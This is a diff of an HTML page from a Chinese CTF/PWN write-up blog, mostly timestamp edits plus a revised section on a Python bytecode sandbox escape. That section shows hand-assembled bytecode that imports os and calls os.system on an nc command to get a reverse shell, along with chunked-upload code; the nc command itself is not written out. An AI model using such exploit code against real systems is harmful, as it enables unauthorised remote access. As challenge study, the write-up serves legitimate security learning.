@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
 <meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
-<meta property="article:modified_time" content="2022-11-25T01:50:36.072Z">
+<meta property="article:modified_time" content="2022-11-25T16:25:52.559Z">
 <meta property="article:author" content="Yogdzewa">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="PWN">
@@ -225,7 +225,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1071 分钟
+      1079 分钟
     </span>
   
 
@@ -266,7 +266,7 @@
             
               <p class="note note-info">
                 
-                  不可视境界线最后变动于：2022年11月25日 上午
+                  不可视境界线最后变动于：2022年11月26日 凌晨
                 
               </p>
             
@@ -300,7 +300,7 @@
 <li>Query (<code>0xc010d903</code>): takes two node descriptors and calculates the total weight of the shortest path between them.</li>
 </ul>
 <p>在release中: 如果refcount==1(正常情况), 释放traversal中nodes(如果有), 释放edge链表节点, 释放node. </p>
-<p>其中的一些细节:</p>
+<p>其中的一些细节: </p>
 <ul>
 <li>open时每个节点的refcount默认为1, 当finalize的时候只有root节点进入<code>traversal()</code>函数时(第一次进入)不增加refcount, 这就意味着除了root, 其他的节点的refcount都会变成2. 而当release root的时候只有root.refcount小于2, 于是只有root的edge+traversal+node本身都被<code>kfree()</code>. <strong>看似正常, 实际上?</strong> </li>
 <li>Info中有一个node-&gt;traversal-&gt;size的访问链, 而size在traversal中offset为0的位置. 意味着如果能够控制traversal字段那就可以实现任意读. <strong>如何控制traversal?</strong> </li>
@@ -870,34 +870,25 @@
 <h4 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># This is the index where we will later store the nc command</span><br>nc_index = <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;b&quot;</span>)<br>co_names = [<span class="hljs-string">&quot;len&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>]<br><br>exploit_asm = [<br>    <span class="hljs-comment"># Get length of empty list to push 0 on the stack</span><br>    (<span class="hljs-string">&quot;BUILD_LIST&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Use NOP as arg to simplify compiler ?????what is nop?? 不就是压入了一个long类型的0吗, 这个指令不需要参数.</span><br>    (<span class="hljs-string">&quot;GET_LEN&quot;</span>, <span class="hljs-number">0x09</span>),<br>    <span class="hljs-comment"># Invoke print() to push None onto the stack</span><br>    (<span class="hljs-string">&quot;LOAD_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;print&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_FUNCTION&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Import os</span><br>    (<span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, co_names.index(<span class="hljs-string">&quot;os&quot;</span>)),<br>    <span class="hljs-comment"># Invoke os.system()</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;system&quot;</span>)),<br>    <span class="hljs-comment"># Decode first batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index),	<span class="hljs-comment">#load了一个string object, 所以可以在他之上调用decode函数.</span><br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode second batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">1</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Decode third batch of nc command</span><br>    (<span class="hljs-string">&quot;LOAD_CONST&quot;</span>, nc_index + <span class="hljs-number">2</span>),<br>    (<span class="hljs-string">&quot;LOAD_METHOD&quot;</span>, co_names.index(<span class="hljs-string">&quot;decode&quot;</span>)),<br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">0</span>),<br>    <span class="hljs-comment"># Concatenate the three strings</span><br>    (<span class="hljs-string">&quot;BUILD_STRING&quot;</span>, <span class="hljs-number">3</span>),<br>    <span class="hljs-comment"># Finaly invoke the nc command</span><br>    (<span class="hljs-string">&quot;CALL_METHOD&quot;</span>, <span class="hljs-number">1</span>),<br>]<br></code></pre></div></td></tr></table></figure>
 
 <p>Then, we can “assemble” the code:</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exploit_bytecode = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> op_name, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exploit_bytecode += <span class="hljs-built_in">bytes</span>([opmap[op_name], arg])<br><span class="hljs-comment"># add consts</span><br>exploit_bytecode += <span class="hljs-string">b&quot;;&quot;</span><br>exploit_bytecode += <span class="hljs-string">b&quot;;&quot;</span>.join(n.encode() <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> co_names)<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">exp_bc = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> op_name, arg <span class="hljs-keyword">in</span> exploit_asm:<br>    exp_bc += <span class="hljs-built_in">bytes</span>([opmap[op_name], arg])<br><span class="hljs-comment"># add consts</span><br>exp_bc += <span class="hljs-string">b&quot;;&quot;</span><br>exp_bc += <span class="hljs-string">b&quot;;&quot;</span>.join(n.encode() <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> co_names)<br></code></pre></div></td></tr></table></figure>
 
 <p>可以看出来指令非常的简单, 就是一个字节指令加上一个字节操作数. </p>
 <p>为什么是分号? <strong>是题目源码中识别到有分号时自动把names加入到CodeObject.names</strong> </p>
-<h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in chunks"></a>Upload exploit bytecode in chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">num_chunks = <span class="hljs-built_in">len</span>(exploit_bytecode) // chunk_size + <span class="hljs-number">1</span><br>exploit_bytecode = exploit_bytecode.ljust(chunk_size * num_chunks, <span class="hljs-string">b&quot;;&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exploit_bytecode), chunk_size):<br>    upload_file(exploit_bytecode[i : i + chunk_size])<br></code></pre></div></td></tr></table></figure>
+<h4 id="Upload-exploit-bytecode-in-chunks"><a href="#Upload-exploit-bytecode-in-chunks" class="headerlink" title="Upload exploit bytecode in chunks"></a>Upload exploit bytecode in chunks</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">num_chunks = <span class="hljs-built_in">len</span>(exp_bc) // chunk_size + <span class="hljs-number">1</span><br>exp_bc = exp_bc.ljust(chunk_size * num_chunks, <span class="hljs-string">b&quot;;&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(exp_bc), chunk_size):<br>    upload_file(exp_bc[i : i + chunk_size])<br></code></pre></div></td></tr></table></figure>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<p>把exp分成chunk上传到keys中后, 再上传多个limit_code作为plugin, 用于将每个key中的exp_bc附加到log(其实是<code>./plugins</code>)后面, 拼接成exp. </p>
+<ul>
+<li>要注意的是keys加入consts的时候是通过遍历dict来实现的, <del>所以consts顺序是字典序从大到小</del>.for遍历输出居然是按照<a target="_blank" rel="noopener" href="https://docs.python.org/3.10/library/stdtypes.html#dictionary-view-objects">加入的顺序</a>, 测试的时候是直接赋初值然后输出, 结果是字典序. 最后是plugin_log函数object. 这导致每个limit_code中msg的偏移都不一样, 但filename和raw是一样的. </li>
+<li><del>也不对啊, <code>for k in entries</code>这样取出来的是字典中的tuple, 这一个tuple怎么load_const再decode?</del> </li>
+</ul>
+<blockquote>
+<p>python不过关, 做题两行泪: <code>list(dict)</code><a target="_blank" rel="noopener" href="https://docs.python.org/3.11/library/stdtypes.html#mapping-types-dict">只会返回key</a>, 而<code>for k in dict</code>同理……….</p>
+<blockquote>
+<p><strong>iter(d)</strong>: Return an iterator over the keys of the dictionary. This is a shortcut for <code>iter(d.keys())</code>.</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&gt;&gt;&gt;d<br>&#123;<span class="hljs-string">&#x27;one&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;two&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;three&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;four&#x27;</span>: <span class="hljs-number">4</span>&#125;<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d)<br>[<span class="hljs-string">&#x27;one&#x27;</span>, <span class="hljs-string">&#x27;two&#x27;</span>, <span class="hljs-string">&#x27;three&#x27;</span>, <span class="hljs-string">&#x27;four&#x27;</span>]<br>&gt;&gt;&gt;<span class="hljs-built_in">list</span>(d.values())<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br></code></pre></div></td></tr></table></figure>
+</blockquote>
+<p>最终执行exp达到reverse shell的效果. </p>
 <h2 id="RIOT"><a href="#RIOT" class="headerlink" title="RIOT"></a>RIOT</h2><p>RIOT src <a target="_blank" rel="noopener" href="https://github.com/RIOT-OS/RIOT/blob/a21f05aeffd9fdf0e61026d85b465c652a9cf8c9/drivers/ethos/ethos.c#L379">off-by-one</a> </p>
 <ul>
 <li></li>
